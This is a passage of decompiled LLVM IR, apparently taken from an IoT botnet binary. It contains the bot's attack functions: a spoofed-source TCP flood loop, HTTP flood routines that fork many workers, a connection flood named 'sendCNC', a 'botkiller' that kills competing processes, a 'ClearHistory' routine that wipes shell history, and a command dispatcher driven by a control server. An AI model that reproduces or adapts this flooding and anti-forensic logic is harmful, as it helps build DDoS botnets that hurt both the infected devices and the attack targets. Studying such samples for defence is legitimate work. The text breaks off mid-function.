  store i32 %v1_10009a88, i32* @r3, align 4
  %v1_10009a90 = call i32 @htons(i32 %v1_10009a88)
  %extract.t = trunc i32 %v1_10009a90 to i16
  br label %dec_label_pc_10009a9c

dec_label_pc_10009a9c:                            ; preds = %dec_label_pc_10009a70, %dec_label_pc_10009a84
  %storemerge60.off0 = phi i16 [ %extract.t, %dec_label_pc_10009a84 ], [ %extract.t63, %dec_label_pc_10009a70 ]
  %v3_10009aa4 = add i32 %v1_100097b4, 22
  %v4_10009aa4 = inttoptr i32 %v3_10009aa4 to i16*
  store i16 %storemerge60.off0, i16* %v4_10009aa4, align 2
  store i32 268475060, i32* @lr, align 4
  %v3_10009ab0 = inttoptr i32 %v1_100097d4 to i32*
  %v4_10009ab0 = call i32 @tcpcsum(i32 %v1_100097b4, i32* %v3_10009ab0, i32 %v1_100097d4)
  %v1_10009abc = trunc i32 %v4_10009ab0 to i16
  store i16 %v1_10009abc, i16* %v4_10009a54, align 4
  %v1_10009acc = or i32 %v1_100097b4, 2
  %v2_10009acc = inttoptr i32 %v1_10009acc to i16*
  %v3_10009acc = load i16, i16* %v2_10009acc, align 2
  %v4_10009acc = zext i16 %v3_10009acc to i32
  %v5_10009adc = inttoptr i32 %v1_100097b4 to i16*
  %v6_10009adc = call i32 @csum(i16* %v5_10009adc, i32 %v4_10009acc, i32 %v1_100097b4, i32 6, i32 %v1_100097fc)
  %sext3 = mul i32 %v6_10009adc, 65536
  %v1_10009ae0 = sdiv i32 %sext3, 65536
  %v1_10009ae8 = trunc i32 %v1_10009ae0 to i16
  %v3_10009ae8 = or i32 %v1_100097b4, 10
  %v4_10009ae8 = inttoptr i32 %v3_10009ae8 to i16*
  store i16 %v1_10009ae8, i16* %v4_10009ae8, align 2
  store i32 268475124, i32* @lr, align 4
  %v1_10009af0 = call i32 @__GI_time(i32 0)
  %v2_10009afc = add i32 %v1_10009af0, %arg3
  %v2_10009b50 = or i32 %v1_100097b4, 12
  %v3_10009b50 = inttoptr i32 %v2_10009b50 to i32*
  %v3_10009b64 = or i32 %v1_100097b4, 4
  %v4_10009b64 = inttoptr i32 %v3_10009b64 to i16*
  br label %dec_label_pc_10009b10

dec_label_pc_10009b10:                            ; preds = %dec_label_pc_10009b10.backedge, %dec_label_pc_10009a9c
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10009a9c ], [ %storemerge22, %dec_label_pc_10009b10.backedge ]
  store i32 268475188, i32* @lr, align 4
  %v7_10009b30 = call i32 @__libc_sendto(i32 %v3_100096c0, i32 %v1_100097b4, i32 %v1_1000977c, i32 0, i32 %v2_10009678, i32 16, i32 %v2_10009678)
  %v1_10009b38 = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_10009b38, i32* @r3, align 4
  %v1_10009b44 = call i32 @htonl(i32 %v1_10009b38)
  store i32 %v1_10009b44, i32* %v3_10009b50, align 4
  %v0_10009b54 = call i32 @rand_cmwc()
  %v1_10009b64 = trunc i32 %v0_10009b54 to i16
  store i16 %v1_10009b64, i16* %v4_10009b64, align 4
  %v0_10009b68 = call i32 @rand_cmwc()
  store i32 %v0_10009b68, i32* %v3_10009838, align 8
  %v0_10009b78 = call i32 @rand_cmwc()
  %v1_10009b88 = trunc i32 %v0_10009b78 to i16
  store i16 %v1_10009b88, i16* %v5_100097d8, align 4
  store i16 0, i16* %v4_10009a54, align 4
  store i32 268475300, i32* @lr, align 4
  %v4_10009ba0 = call i32 @tcpcsum(i32 %v1_100097b4, i32* %v3_10009ab0, i32 %v1_100097d4)
  %v1_10009bac = trunc i32 %v4_10009ba0 to i16
  store i16 %v1_10009bac, i16* %v4_10009a54, align 4
  %v3_10009bbc = load i16, i16* %v2_10009acc, align 2
  %v4_10009bbc = zext i16 %v3_10009bbc to i32
  %v6_10009bcc = call i32 @csum(i16* %v5_10009adc, i32 %v4_10009bbc, i32 %v1_100097b4, i32 0, i32 %v2_10009678)
  %v1_10009bd8 = trunc i32 %v6_10009bcc to i16
  store i16 %v1_10009bd8, i16* %v4_10009ae8, align 2
  %v4_10009be4 = icmp eq i32 %stack_var_-44.0, %arg7
  br i1 %v4_10009be4, label %dec_label_pc_10009bec, label %dec_label_pc_10009c10

dec_label_pc_10009bec:                            ; preds = %dec_label_pc_10009b10
  store i32 268475380, i32* @lr, align 4
  %v1_10009bf0 = call i32 @__GI_time(i32 0)
  %v3_10009bfc = icmp sgt i32 %v1_10009bf0, %v2_10009afc
  br i1 %v3_10009bfc, label %dec_label_pc_10009c20, label %dec_label_pc_10009b10.backedge

dec_label_pc_10009b10.backedge:                   ; preds = %dec_label_pc_10009bec, %dec_label_pc_10009c10
  %storemerge22 = phi i32 [ %v1_10009c14, %dec_label_pc_10009c10 ], [ 0, %dec_label_pc_10009bec ]
  br label %dec_label_pc_10009b10

dec_label_pc_10009c10:                            ; preds = %dec_label_pc_10009b10
  %v1_10009c14 = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_10009b10.backedge

dec_label_pc_10009c20:                            ; preds = %dec_label_pc_10009bec, %dec_label_pc_10009678, %dec_label_pc_10009728, %dec_label_pc_100096d8
  %v0_10009c48 = phi i32 [ %v4_10009688, %dec_label_pc_10009678 ], [ %v4_10009740, %dec_label_pc_10009728 ], [ %v4_100096f0, %dec_label_pc_100096d8 ], [ %v1_10009bf0, %dec_label_pc_10009bec ]
  ret i32 %v0_10009c48

; uselistorder directives
  uselistorder i32 %v1_10009a88, { 1, 0 }
  uselistorder i32 %v3_10009a20, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i32* %v2_1000984c, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %v1_100097fc, { 1, 0 }
  uselistorder i32 %v1_100097d4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_100097b4, { 14, 15, 4, 2, 3, 5, 16, 1, 6, 17, 7, 8, 9, 10, 0, 11, 12, 13, 18, 19 }
  uselistorder i32 %v2_10009678, { 1, 3, 2, 0 }
  uselistorder i32 %v1_10009664, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 -16, { 1, 0, 3, 2, 5, 4, 6 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10009c20, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10009b10.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10009a9c, { 1, 0 }
  uselistorder label %dec_label_pc_10009a14, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_100098f0, { 1, 0 }
  uselistorder label %dec_label_pc_10009778, { 1, 0 }
  uselistorder label %dec_label_pc_10009678, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10009c4c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10009c4c, i32* %stack_var_-112, align 4
  %v5_10009c4c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v5_10009c4c, i32* @r31, align 4
  %v2_10009c6c = ptrtoint i8** %stack_var_-100 to i32
  %v2_10009cb4 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_10009c60

dec_label_pc_10009c60:                            ; preds = %dec_label_pc_10009d50, %entry
  br label %dec_label_pc_10009c6c

dec_label_pc_10009c6c:                            ; preds = %dec_label_pc_10009c60, %dec_label_pc_10009c6c
  %storemerge34 = phi i32 [ 0, %dec_label_pc_10009c60 ], [ %v1_10009d3c, %dec_label_pc_10009c6c ]
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v1_10009c9c = mul i32 %storemerge34, 4
  %v2_10009ca0 = add i32 %v1_10009c9c, ptrtoint ([86 x i8*]* @global_var_1002824c.461 to i32)
  %v1_10009ca4 = inttoptr i32 %v2_10009ca0 to i32*
  %v2_10009ca4 = load i32, i32* %v1_10009ca4, align 4
  store i32 %v2_10009ca4, i32* @r4, align 4
  %v3_10009cb4 = call i32 @strcat(i8* %v2_10009cb4, i32 %v2_10009ca4)
  store i32 268475588, i32* @lr, align 4
  %v1_10009cc0 = call i32 @__libc_system(i32 %v2_10009c6c)
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v2_10009d04 = load i32, i32* %v1_10009ca4, align 4
  store i32 %v2_10009d04, i32* @r4, align 4
  %v3_10009d14 = call i32 @strcat(i8* %v2_10009cb4, i32 %v2_10009d04)
  store i32 ptrtoint (i32* @global_var_10016568.466 to i32), i32* @r4, align 4
  %v3_10009d28 = call i32 @strcat(i8* %v2_10009cb4, i32 ptrtoint (i32* @global_var_10016568.466 to i32))
  store i32 268475704, i32* @lr, align 4
  %v1_10009d34 = call i32 @__libc_system(i32 %v2_10009c6c)
  %v1_10009d3c = add nuw nsw i32 %storemerge34, 1
  %tmp13 = icmp slt i32 %v1_10009d3c, 9
  br i1 %tmp13, label %dec_label_pc_10009c6c, label %dec_label_pc_10009d50

dec_label_pc_10009d50:                            ; preds = %dec_label_pc_10009c6c
  store i32 268475736, i32* @lr, align 4
  %v1_10009d54 = call i32 @sleep(i32 5)
  br label %dec_label_pc_10009c60

; uselistorder directives
  uselistorder i32 %storemerge34, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder [3 x i8]* @global_var_10014e70.19, { 1, 0 }
  uselistorder label %dec_label_pc_10009c6c, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10009d5c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10009d5c, i32* %stack_var_-16, align 4
  %v5_10009d5c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v5_10009d5c, i32* @r31, align 4
  store i32 268475772, i32* @lr, align 4
  %v2_10009d78 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1001656c.467 to i32))
  store i32 268475784, i32* @lr, align 4
  %v2_10009d84 = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_10016584.468 to i32))
  store i32 268475796, i32* @lr, align 4
  %v2_10009d90 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_100165a4.469 to i32))
  ret i32 %v2_10009d90

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 4, 3, 2, 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-580 = alloca i32, align 4
  %stack_var_-632 = alloca i32, align 4
  store i32 268475976, i32* @lr, align 4
  %v1_10009e44 = call i32 @__GI_time(i32 0)
  %v2_10009e50 = add i32 %v1_10009e44, %arg5
  store i32 268475996, i32* @lr, align 4
  %v0_10009e58 = call i32 @random()
  %v2_10009e90 = ptrtoint i32* %stack_var_-632 to i32
  store i32 268476068, i32* @lr, align 4
  %v0_10009ea0 = call i32 @random()
  %v2_10009ec0 = srem i32 %v0_10009ea0, 7
  %v1_10009edc = mul nsw i32 %v2_10009ec0, 4
  %v2_10009ee4 = add i32 %v2_10009e90, 12
  %v1_10009ee8 = add i32 %v2_10009ee4, %v1_10009edc
  %v1_10009eec = inttoptr i32 %v1_10009ee8 to i32*
  %v2_10009eec = load i32, i32* %v1_10009eec, align 4
  %v2_10009ef0 = ptrtoint i32* %stack_var_-580 to i32
  store i32 %v2_10009ef0, i32* @r3, align 4
  %v0_10009f08 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10009f18.491 to i32), i32* @lr, align 4
  %v9_10009f14 = call i32 @sprintf(i32 %v2_10009ef0, i32 ptrtoint ([62 x i8]* @global_var_100167d8.490 to i32), i32 %arg2, i32 %arg4, i32 %v0_10009f08, i32 %v2_10009eec, i32 268500992, i32 %v2_10009ec0)
  %v2_10009fc46 = icmp sgt i32 %arg6, 0
  br i1 %v2_10009fc46, label %dec_label_pc_10009f24.lr.ph, label %dec_label_pc_10009fcc

dec_label_pc_10009f24.lr.ph:                      ; preds = %entry
  br label %dec_label_pc_10009f24

dec_label_pc_10009f24:                            ; preds = %dec_label_pc_10009f24.lr.ph, %dec_label_pc_10009fb0
  %storemerge19 = phi i32 [ 0, %dec_label_pc_10009f24.lr.ph ], [ %v1_10009fb4, %dec_label_pc_10009fb0 ]
  store i32 268476200, i32* @lr, align 4
  %v0_10009f24 = call i32 @__libc_fork()
  %v3_10009f2c = icmp eq i32 %v0_10009f24, 0
  br i1 %v3_10009f2c, label %dec_label_pc_10009fb0, label %dec_label_pc_10009f90.preheader

dec_label_pc_10009f90.preheader:                  ; preds = %dec_label_pc_10009f24
  store i32 268476312, i32* @lr, align 4
  %v1_10009f942 = call i32 @__GI_time(i32 0)
  %v2_10009fa03 = icmp slt i32 %v1_10009f942, %v2_10009e50
  br i1 %v2_10009fa03, label %dec_label_pc_10009f38, label %dec_label_pc_10009fa8

dec_label_pc_10009f38:                            ; preds = %dec_label_pc_10009f90.preheader, %dec_label_pc_10009f90.backedge
  %v3_10009f4c = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  store i32 %v3_10009f4c, i32* %stack_var_-632, align 4
  %v3_10009f5c = icmp eq i32 %v3_10009f4c, 0
  br i1 %v3_10009f5c, label %dec_label_pc_10009f90.backedge, label %dec_label_pc_10009f64

dec_label_pc_10009f64:                            ; preds = %dec_label_pc_10009f38
  store i32 %v2_10009ef0, i32* @r3, align 4
  %v0_10009f6c = call i32 @__GI_strlen()
  %v3_10009f78 = load i32, i32* %stack_var_-632, align 4
  store i32 268476296, i32* @lr, align 4
  %v2_10009f84 = call i32 @__libc_write(i32 %v3_10009f78, i32 %v2_10009ef0)
  %v3_10009f88 = load i32, i32* %stack_var_-632, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009f90.492 to i32), i32* @lr, align 4
  %v1_10009f8c = call i32 @__libc_close(i32 %v3_10009f88)
  br label %dec_label_pc_10009f90.backedge

dec_label_pc_10009f90.backedge:                   ; preds = %dec_label_pc_10009f64, %dec_label_pc_10009f38
  store i32 268476312, i32* @lr, align 4
  %v1_10009f94 = call i32 @__GI_time(i32 0)
  %v2_10009fa0 = icmp slt i32 %v1_10009f94, %v2_10009e50
  br i1 %v2_10009fa0, label %dec_label_pc_10009f38, label %dec_label_pc_10009fa8

dec_label_pc_10009fa8:                            ; preds = %dec_label_pc_10009f90.backedge, %dec_label_pc_10009f90.preheader
  %v1_10009fac = call i32 @__GI__exit(i32 1)
  br label %dec_label_pc_10009fb0

dec_label_pc_10009fb0:                            ; preds = %dec_label_pc_10009f24, %dec_label_pc_10009fa8
  %v0_10009fe411 = phi i32 [ 0, %dec_label_pc_10009f24 ], [ %v1_10009fac, %dec_label_pc_10009fa8 ]
  %v1_10009fb4 = add nuw nsw i32 %storemerge19, 1
  %v2_10009fc4 = icmp slt i32 %v1_10009fb4, %arg6
  br i1 %v2_10009fc4, label %dec_label_pc_10009f24, label %dec_label_pc_10009fcc

dec_label_pc_10009fcc:                            ; preds = %dec_label_pc_10009fb0, %entry
  %v0_10009fe4 = phi i32 [ %v9_10009f14, %entry ], [ %v0_10009fe411, %dec_label_pc_10009fb0 ]
  ret i32 %v0_10009fe4

; uselistorder directives
  uselistorder i32 %v2_10009ef0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10009e50, { 1, 0 }
  uselistorder i32 268476312, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_10009fb0, { 1, 0 }
  uselistorder label %dec_label_pc_10009f38, { 1, 0 }
  uselistorder label %dec_label_pc_10009f24, { 1, 0 }
}

define i32 @sendHTTP2(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-556 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  store i32 268476512, i32* @lr, align 4
  %v1_1000a05c = call i32 @__GI_time(i32 0)
  %v2_1000a068 = add i32 %v1_1000a05c, %arg5
  store i32 0, i32* %stack_var_-600, align 4
  %v2_1000a1a88 = icmp sgt i32 %arg6, 0
  br i1 %v2_1000a1a88, label %dec_label_pc_1000a084.lr.ph, label %dec_label_pc_1000a1b0

dec_label_pc_1000a084.lr.ph:                      ; preds = %entry
  %v2_1000a0c0 = ptrtoint i32* %stack_var_-600 to i32
  %v2_1000a0c4 = add i32 %v2_1000a0c0, 16
  %v2_1000a0d0 = ptrtoint i32* %stack_var_-556 to i32
  br label %dec_label_pc_1000a084

dec_label_pc_1000a084:                            ; preds = %dec_label_pc_1000a084.lr.ph, %dec_label_pc_1000a194
  %storemerge311 = phi i32 [ 0, %dec_label_pc_1000a084.lr.ph ], [ %v1_1000a198, %dec_label_pc_1000a194 ]
  store i32 268476552, i32* @lr, align 4
  %v0_1000a084 = call i32 @random()
  %v2_1000a0a0 = srem i32 %v0_1000a084, 36
  %v1_1000a0bc = mul nsw i32 %v2_1000a0a0, 4
  %v1_1000a0c8 = add i32 %v2_1000a0c4, %v1_1000a0bc
  %v1_1000a0cc = inttoptr i32 %v1_1000a0c8 to i32*
  %v2_1000a0cc = load i32, i32* %v1_1000a0cc, align 4
  store i32 %v2_1000a0d0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000a0f8.501 to i32), i32* @lr, align 4
  %v9_1000a0f4 = call i32 @sprintf(i32 %v2_1000a0d0, i32 ptrtoint ([64 x i8]* @global_var_10016834.500 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v2_1000a0cc, i32 268500992, i32 %v2_1000a0a0)
  store i32 268476668, i32* @lr, align 4
  %v0_1000a0f8 = call i32 @__libc_fork()
  %v3_1000a100 = icmp eq i32 %v0_1000a0f8, 0
  br i1 %v3_1000a100, label %dec_label_pc_1000a194, label %dec_label_pc_1000a174.preheader

dec_label_pc_1000a174.preheader:                  ; preds = %dec_label_pc_1000a084
  store i32 268476796, i32* @lr, align 4
  %v1_1000a1784 = call i32 @__GI_time(i32 0)
  %v2_1000a1845 = icmp slt i32 %v1_1000a1784, %v2_1000a068
  br i1 %v2_1000a1845, label %dec_label_pc_1000a10c, label %dec_label_pc_1000a18c

dec_label_pc_1000a10c:                            ; preds = %dec_label_pc_1000a174.preheader, %dec_label_pc_1000a174.backedge
  %v3_1000a11c = call i32 @socket_connect(i32 %arg2, i16 %arg3)
  %v3_1000a12c = icmp eq i32 %v3_1000a11c, 0
  br i1 %v3_1000a12c, label %dec_label_pc_1000a174.backedge, label %dec_label_pc_1000a134

dec_label_pc_1000a134:                            ; preds = %dec_label_pc_1000a10c
  store i32 %v2_1000a0d0, i32* @r3, align 4
  %v0_1000a13c = call i32 @__GI_strlen()
  store i32 268476760, i32* @lr, align 4
  %v2_1000a154 = call i32 @__libc_write(i32 %v3_1000a11c, i32 %v2_1000a0d0)
  store i32 268476780, i32* @lr, align 4
  %v1_1000a168 = call i32 @__libc_read(i32 %v3_1000a11c)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a174.502 to i32), i32* @lr, align 4
  %v1_1000a170 = call i32 @__libc_close(i32 %v3_1000a11c)
  br label %dec_label_pc_1000a174.backedge

dec_label_pc_1000a174.backedge:                   ; preds = %dec_label_pc_1000a134, %dec_label_pc_1000a10c
  store i32 268476796, i32* @lr, align 4
  %v1_1000a178 = call i32 @__GI_time(i32 0)
  %v2_1000a184 = icmp slt i32 %v1_1000a178, %v2_1000a068
  br i1 %v2_1000a184, label %dec_label_pc_1000a10c, label %dec_label_pc_1000a18c

dec_label_pc_1000a18c:                            ; preds = %dec_label_pc_1000a174.backedge, %dec_label_pc_1000a174.preheader
  %v0_1000a190 = call i32 @__GI_exit()
  br label %dec_label_pc_1000a194

dec_label_pc_1000a194:                            ; preds = %dec_label_pc_1000a084, %dec_label_pc_1000a18c
  %v0_1000a1c413 = phi i32 [ 0, %dec_label_pc_1000a084 ], [ %v0_1000a190, %dec_label_pc_1000a18c ]
  %v1_1000a198 = add nuw nsw i32 %storemerge311, 1
  %v2_1000a1a8 = icmp slt i32 %v1_1000a198, %arg6
  br i1 %v2_1000a1a8, label %dec_label_pc_1000a084, label %dec_label_pc_1000a1b0

dec_label_pc_1000a1b0:                            ; preds = %dec_label_pc_1000a194, %entry
  %v0_1000a1c4 = phi i32 [ %v1_1000a05c, %entry ], [ %v0_1000a1c413, %dec_label_pc_1000a194 ]
  ret i32 %v0_1000a1c4

; uselistorder directives
  uselistorder i32 %v2_1000a0d0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1000a068, { 1, 0 }
  uselistorder i32 %v1_1000a05c, { 1, 0 }
  uselistorder i32* %stack_var_-600, { 1, 0 }
  uselistorder i32 268476796, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_1000a194, { 1, 0 }
  uselistorder label %dec_label_pc_1000a10c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a084, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  store i32 268476912, i32* @lr, align 4
  %v1_1000a1ec = call i32 @__GI_time(i32 0)
  %v2_1000a1f8 = add i32 %v1_1000a1ec, %arg3
  store i32 268476940, i32* @lr, align 4
  %v1_1000a208 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-48, align 4
  %v1_1000a220 = urem i32 %arg2, 65536
  store i32 %v1_1000a220, i32* @r3, align 4
  %v1_1000a228 = call i32 @htons(i32 %v1_1000a220)
  store i32 268477052, i32* @lr, align 4
  %v1_1000a2781 = call i32 @__GI_time(i32 0)
  %v2_1000a2842 = icmp slt i32 %v1_1000a2781, %v2_1000a1f8
  br i1 %v2_1000a2842, label %dec_label_pc_1000a238.lr.ph, label %dec_label_pc_1000a28c

dec_label_pc_1000a238.lr.ph:                      ; preds = %entry
  %v2_1000a250 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_1000a238

dec_label_pc_1000a238:                            ; preds = %dec_label_pc_1000a238.lr.ph, %dec_label_pc_1000a238
  store i32 268477000, i32* @lr, align 4
  %v3_1000a244 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a264.503 to i32), i32* @lr, align 4
  %v3_1000a260 = call i32 @__libc_connect(i32 %v3_1000a244, i32 %v2_1000a250, i32 16)
  store i32 268477036, i32* @lr, align 4
  %v1_1000a268 = call i32 @sleep(i32 1)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a274.504 to i32), i32* @lr, align 4
  %v1_1000a270 = call i32 @__libc_close(i32 %v3_1000a244)
  store i32 268477052, i32* @lr, align 4
  %v1_1000a278 = call i32 @__GI_time(i32 0)
  %v2_1000a284 = icmp slt i32 %v1_1000a278, %v2_1000a1f8
  br i1 %v2_1000a284, label %dec_label_pc_1000a238, label %dec_label_pc_1000a28c

dec_label_pc_1000a28c:                            ; preds = %dec_label_pc_1000a238, %entry
  %v1_1000a278.lcssa = phi i32 [ %v1_1000a2781, %entry ], [ %v1_1000a278, %dec_label_pc_1000a238 ]
  ret i32 %v1_1000a278.lcssa

; uselistorder directives
  uselistorder i32 %v1_1000a220, { 1, 0 }
  uselistorder i32 %v2_1000a1f8, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 268477052, { 1, 0 }
  uselistorder label %dec_label_pc_1000a238, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-80 = alloca i32, align 4
  %v2_1000a2d8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10015650.30 to i32), i32* @r4, align 4
  %v3_1000a2e8 = inttoptr i32 %v2_1000a2d8 to i8*
  %v4_1000a2e8 = call i32 @__GI_strcoll(i8* %v3_1000a2e8, i32 ptrtoint ([5 x i8]* @global_var_10015650.30 to i32))
  %v3_1000a2f0 = icmp eq i32 %v4_1000a2e8, 0
  br i1 %v3_1000a2f0, label %dec_label_pc_1000a2f8, label %dec_label_pc_1000a318

dec_label_pc_1000a2f8:                            ; preds = %entry
  %v3_1000a2fc = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000a314.506 to i32), i32* @lr, align 4
  %v4_1000a310 = call i32 @sockprintf(i32 %v3_1000a2fc, i32 ptrtoint ([6 x i8]* @global_var_10016874.505 to i32), i32 268500992)
  br label %dec_label_pc_1000b41c

dec_label_pc_1000a318:                            ; preds = %entry
  %v2_1000a31c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1001687c.507 to i32), i32* @r4, align 4
  %v3_1000a32c = inttoptr i32 %v2_1000a31c to i8*
  %v4_1000a32c = call i32 @__GI_strcoll(i8* %v3_1000a32c, i32 ptrtoint ([6 x i8]* @global_var_1001687c.507 to i32))
  %v3_1000a334 = icmp eq i32 %v4_1000a32c, 0
  br i1 %v3_1000a334, label %dec_label_pc_1000a33c, label %dec_label_pc_1000a368

dec_label_pc_1000a33c:                            ; preds = %dec_label_pc_1000a318
  %v3_1000a340 = load i32, i32* @global_var_100287d0.29, align 4
  store i32 268477256, i32* @lr, align 4
  %v1_1000a344 = call i32 @getdtablesize(i32 268632064)
  store i32 ptrtoint (i32* @global_var_1000a364.509 to i32), i32* @lr, align 4
  %v5_1000a360 = call i32 @sockprintf(i32 %v3_1000a340, i32 ptrtoint ([3 x i8]* @global_var_10016884.508 to i32), i32 %v1_1000a344)
  br label %dec_label_pc_1000b41c

dec_label_pc_1000a368:                            ; preds = %dec_label_pc_1000a318
  %v2_1000a36c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10016888.510 to i32), i32* @r4, align 4
  %v3_1000a37c = inttoptr i32 %v2_1000a36c to i8*
  %v4_1000a37c = call i32 @__GI_strcoll(i8* %v3_1000a37c, i32 ptrtoint ([8 x i8]* @global_var_10016888.510 to i32))
  %v3_1000a384 = icmp eq i32 %v4_1000a37c, 0
  br i1 %v3_1000a384, label %dec_label_pc_1000a38c, label %dec_label_pc_1000a4d0

dec_label_pc_1000a38c:                            ; preds = %dec_label_pc_1000a368
  %v1_1000a390 = add i32 %tmp, 4
  %v1_1000a394 = inttoptr i32 %v1_1000a390 to i32*
  %v2_1000a394 = load i32, i32* %v1_1000a394, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10016890.511 to i32), i32* @r4, align 4
  %v3_1000a3a4 = inttoptr i32 %v2_1000a394 to i8*
  %v4_1000a3a4 = call i32 @__GI_strcoll(i8* %v3_1000a3a4, i32 ptrtoint ([4 x i8]* @global_var_10016890.511 to i32))
  %v3_1000a3ac = icmp eq i32 %v4_1000a3a4, 0
  br i1 %v3_1000a3ac, label %dec_label_pc_1000a3b4, label %dec_label_pc_1000a400

dec_label_pc_1000a3b4:                            ; preds = %dec_label_pc_1000a38c
  %v3_1000a3b8 = load i32, i32* @global_var_10028800.512, align 4
  %v3_1000a3bc = icmp eq i32 %v3_1000a3b8, 0
  br i1 %v3_1000a3bc, label %dec_label_pc_1000b41c, label %dec_label_pc_1000a3c4

dec_label_pc_1000a3c4:                            ; preds = %dec_label_pc_1000a3b4
  store i32 268477400, i32* @lr, align 4
  %v2_1000a3d4 = call i32 @kill(i32 %v3_1000a3b8, i32 9)
  %v3_1000a3dc = load i32, i32* @global_var_100287d0.29, align 4
  store i32 268477428, i32* @lr, align 4
  %v4_1000a3f0 = call i32 @sockprintf(i32 %v3_1000a3dc, i32 ptrtoint ([17 x i8]* @global_var_10016894.513 to i32), i32 268500992)
  store i32 0, i32* @global_var_10028800.512, align 4
  br label %dec_label_pc_1000a400

dec_label_pc_1000a400:                            ; preds = %dec_label_pc_1000a38c, %dec_label_pc_1000a3c4
  %v2_1000a408 = load i32, i32* %v1_1000a394, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100168a8.514 to i32), i32* @r4, align 4
  %v3_1000a418 = inttoptr i32 %v2_1000a408 to i8*
  %v4_1000a418 = call i32 @__GI_strcoll(i8* %v3_1000a418, i32 ptrtoint ([3 x i8]* @global_var_100168a8.514 to i32))
  %v3_1000a420 = icmp eq i32 %v4_1000a418, 0
  br i1 %v3_1000a420, label %dec_label_pc_1000a428, label %dec_label_pc_1000a4d0

dec_label_pc_1000a428:                            ; preds = %dec_label_pc_1000a400
  %v3_1000a42c = load i32, i32* @global_var_10028800.512, align 4
  %v3_1000a430 = icmp eq i32 %v3_1000a42c, 0
  br i1 %v3_1000a430, label %dec_label_pc_1000a438, label %dec_label_pc_1000b41c

dec_label_pc_1000a438:                            ; preds = %dec_label_pc_1000a428
  store i32 268477500, i32* @lr, align 4
  %v0_1000a438 = call i32 @__libc_fork()
